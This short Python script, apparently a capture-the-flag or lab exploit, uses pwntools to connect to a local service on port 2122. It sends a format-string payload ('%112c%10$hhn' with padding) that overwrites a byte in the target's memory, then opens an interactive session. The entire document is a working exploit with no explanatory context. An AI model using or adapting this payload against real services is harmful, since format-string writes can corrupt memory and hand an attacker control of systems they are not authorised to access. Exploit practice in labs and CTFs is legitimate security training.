from pwn import *

p = remote("127.0.0.1",2122)
payload = '%112c%10$hhnAAAAAAAAAAAAAAAAAAAAx'

p.send(payload)
p.interactive()



